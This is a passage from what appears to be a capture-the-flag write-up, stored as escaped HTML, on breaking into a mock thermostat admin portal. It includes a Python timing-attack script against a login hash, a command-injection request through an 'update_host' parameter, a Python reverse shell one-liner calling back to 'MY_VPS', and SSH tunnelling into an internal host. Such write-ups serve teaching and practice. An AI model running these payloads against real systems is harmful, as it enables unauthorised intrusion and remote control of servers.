0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=82a3180eb2c9565fe0adce6bcd4905a5a1bd48d41239b31af216e0d1e45a9605\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIn the database dump, there was a database named \u003ccode\u003eflitebackend\u003c/code\u003e with the \u003ccode\u003edevices\u003c/code\u003e and \u003ccode\u003eusers\u003c/code\u003e tables. \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eThe \u003ccode\u003eusers\u003c/code\u003e table contained the username and hashed password of the user that I previously discovered. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe \u003ccode\u003edevices\u003c/code\u003e table contained 150 entries with IP addresses.\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI created a list with those IPs and used Nmap to scan them:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003enmap -iL list.txt -T4\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003e104.196.12.98\u003c/code\u003e was up and port 80 was open!\u003c/p\u003e\n\n\u003ch2 id=\"stage-4-time-is-precious\"\u003eStage 4 - Time is precious\u003c/h2\u003e\n\n\u003cp\u003eThere was a login page on \u003ca title=\"http://104.196.12.98\" href=\"/redirect?url=http%3A%2F%2F104.196.12.98\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://104.196.12.98\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which got me stuck for quite some time.\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003elogin.js\u003c/code\u003e script was generating a 64 byte hash of the username and password when sending a login request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: 35.243.186.41\nContent-Type: application/x-www-form-urlencoded\n\nhash=e8765a4952a4f5d74b43e35d8fed6a0221c6877fba60a251aabde752f5ed13d8\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAuthentication requests with the username \u003ccode\u003eadmin\u003c/code\u003e and \u003ccode\u003ef\u003c/code\u003e or \u003ccode\u003eh\u003c/code\u003e as the password were taking quite longer to process than other login attempts. I also noticed that login attempts with the \u003ccode\u003eadmin:f\u003c/code\u003e and \u003ccode\u003eadmin:h\u003c/code\u003e credentials were both generating a hash starting with the \u003ccode\u003ef9\u003c/code\u003e characters.\u003c/p\u003e\n\n\u003cp\u003eSince some login attempts were taking more time than others to process, I was pretty sure I was dealing with a \u003cstrong\u003etiming attack\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eA few hours down the road, I realized that there were a few requirements for this attack to work:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eThe hash had to be 64 bytes\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe hash had to contain a specific set of alphanumeric characters =\u0026gt; \u003ccode\u003e[a-f0-9]\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe brute-force had to be executed for every 2 bytes. So, in order to notice a time increase, we need to find the next 2 correct bytes, and so on until we find the right 64 byte hash.\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eA quick Python script did the trick:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;list.txt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;r\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"nb\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hash\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;f9\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erstrip\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://104.196.12.98\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etotal_seconds\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Time taken: \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot; for \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erstrip\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"nb\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003elist.txt\u003c/code\u003e file used by the script contained a pre-generated list of all the 2 byte combinations of \u003ccode\u003e[a-f0-9]\u003c/code\u003e. On a few occasions, there was some network latency that was causing inconsistencies in the responses and would\u0026#39;ve led me to false positives. For that particular reason, I decided to run the attack in a semi-automated fashion - the script allowed me to manually inspect if the time variation was legitimate before jumping to the next 2 bytes.\u003c/p\u003e\n\n\u003cp\u003eIf a request took an extra 500-515 milliseconds to return the response, then I knew which 2 valid characters were next in the hash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eTime taken: 3.018276 for a0\nTime taken: 3.022713 for a1\nTime taken: 3.018442 for a2\nTime taken: 3.018941 for a3\nTime taken: 3.517988 for a4      =\u0026gt; a4 took an extra 500ms\nTime taken: 3.018825 for a5\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter a little while, I obtained the valid hash to login successfully:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ef9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Admin-2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/897/aef1535c6701ef8a1462563eee78bedceeccf6c7/Admin-2.png?response-content-disposition=attachment%3B%20filename%3D%22Admin-2.png%22%3B%20filename%2A%3DUTF-8%27%27Admin-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=47bf6db504f170c4954cd2f4484d42a8873832e4f4d2d3104e421e5ee113cc9d\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/897/aef1535c6701ef8a1462563eee78bedceeccf6c7/Admin-2.png?response-content-disposition=attachment%3B%20filename%3D%22Admin-2.png%22%3B%20filename%2A%3DUTF-8%27%27Admin-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=47bf6db504f170c4954cd2f4484d42a8873832e4f4d2d3104e421e5ee113cc9d\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"stage-5-interesting-parameters\"\u003eStage 5 - Interesting Parameters\u003c/h2\u003e\n\n\u003cp\u003eThe \u003cstrong\u003eFliteThermostat Admin\u003c/strong\u003e portal presented two functionalities: \u003cstrong\u003eTemperature control\u003c/strong\u003e and \u003cstrong\u003eCheck for updates\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eLooking at the source code of the admin page, there was a commented out reference to \u003ccode\u003e/diagnostics\u003c/code\u003e. When I visited the endpoint, a \u003ccode\u003e403 Forbidden\u003c/code\u003e error was always returned, which kept me very busy trying to bypass it.\u003c/p\u003e\n\n\u003cp\u003eHowever, the \u003cstrong\u003eCheck for updates\u003c/strong\u003e feature on the \u003ccode\u003e/update\u003c/code\u003e endpoint caught my attention:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI instantly thought of an SSRF attack since it looked like the server was trying to connect to \u003ccode\u003eupdate.flitethermostat\u003c/code\u003e on port 5000 and the time taken for the request to complete was around 3 seconds. \u003c/p\u003e\n\n\u003cp\u003eI quickly identified the \u003ccode\u003eport\u003c/code\u003e parameter and was able to control the port the server was possibly trying to reach:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eGET /update?port=xxx\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eBut I also wanted to control the host as all the requests seemed like they were sent to \u003ccode\u003eupdate.flitethermostat\u003c/code\u003e. So, I tried to connect the dots:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eI was on \u003ccode\u003e/update\u003c/code\u003e and had control over the \u003ccode\u003eport\u003c/code\u003e parameter.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eI had to find a parameter that would control the host the server was possibly connecting to.\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThat\u0026#39;s when I started thinking of new parameters. I made a list of words like \u003ccode\u003eupdate\u003c/code\u003e, \u003ccode\u003ehost\u003c/code\u003e, \u003ccode\u003ehostname\u003c/code\u003e, \u003ccode\u003eset\u003c/code\u003e, \u003ccode\u003eget\u003c/code\u003e and combined them with characters like \u003ccode\u003e-\u003c/code\u003e and \u003ccode\u003e_\u003c/code\u003e. Using the list of combined words, I found the \u003ccode\u003eupdate_host\u003c/code\u003e parameter.\u003c/p\u003e\n\n\u003cp\u003eHowever, it didn\u0026#39;t seem like the \u003ccode\u003eupdate_host\u003c/code\u003e parameter did much in terms of having control over the host. In fact, there was no sign of SSRF or XSPA when pointing it to localhost or to my VPS.\u003c/p\u003e\n\n\u003cp\u003eLater on, I determined that there was no input sanitization and that the input was actually used in an unsafe way by the server which led to command injection:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eGET /update?port=22\u0026amp;update_host=localhost%26%26echo%20$(id)\u003c/code\u003e =\u0026gt; \u003ccode\u003elocalhost\u0026amp;\u0026amp;echo $(id)\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eConnecting to http://localhost and downloading update manifest\n...\n...\n...\nCould not connect\nuid=0(root) gid=0(root) groups=0(root):22/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGetting a shell on the server was possible with a Python reverse shell one-liner:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003epython \u003cspan class=\"nt\"\u003e-c\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;MY_VPS\u0026quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"stage-6-tunnels\"\u003eStage 6 - Tunnels\u003c/h2\u003e\n\n\u003cp\u003eI was root on \u003ccode\u003e172.28.0.2\u003c/code\u003e and thought the CTF was over. However, I wanted to do a bit of recon on this box, so I used Nmap to scan the internal network and this is when the \u003ccode\u003e172.28.0.3\u003c/code\u003e host was discovered:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003enmap \u003cspan class=\"nt\"\u003e-sn\u003c/span\u003e 172.28.0.0/24 \u003cspan class=\"nt\"\u003e-T4\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI quickly set up a multi-hop SSH tunnel in order to communicate with \u003ccode\u003e172.28.0.3:80\u003c/code\u003e and to proxy the traffic with Burp Suite.\u003c/p\u003e\n\n\u003cp\u003eOn my local machine:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003essh \u003cspan class=\"nt\"\u003e-L\u003c/span\u003e 8888:127.0.0.1:8444 50mctf@MY_VPS\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOn the \u003ccode\u003e172.28.0.2\u003c/code\u003e machine: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003essh \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"nv\"\u003ePubkeyAuthentication\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"nv\"\u003ePreferredAuthentications\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003epassword \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"nv\"\u003eGatewayPorts\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003eyes\u003c/span\u003e \u003cspan class=\"nt\"\u003e-fN\u003c/span\u003e \u003cspan class=\"nt\"\u003e-R\u003c/span\u003e \u003cspan class=\"k\"\u003e*\u003c/span\u003e:8444:172.28.0.3:80 50mctf@MY_VPS\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBrowsing to \u003ccode\u003elocalhost:8888\u003c/code\u003e successfully displayed the web application hosted on \u003ccode\u003e172.28.0.3:80\u003c/code\u003e:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Accounting-2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/898/e2f0d942b25d4917a73cec571a956c2ce66db54d/Accounting-2.png?response-content-disposition=attachment%3B%20filename%3D%22Accounting-2.png%22%3B%20filename%2A%3DUTF-8%27%27Accounting-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=8be1c27c93fc31174c958697518fd038737cbdf94f8391e4e6e0d3840cb8d554\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/898/e2f0d942b25d4917a73cec571a956c2ce66db54d/Accounting-2.png?response-content-disposition=attachment%3B%20filename%3D%22Accounting-2.png%22%3B%20filename%2A%3DUTF-8%27%27Accounting-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=8be1c27c93fc31174c958697518fd038737cbdf94f8391e4e6e0d3840cb8d554\" class=\"markdown-inline-image\" style=\"display: 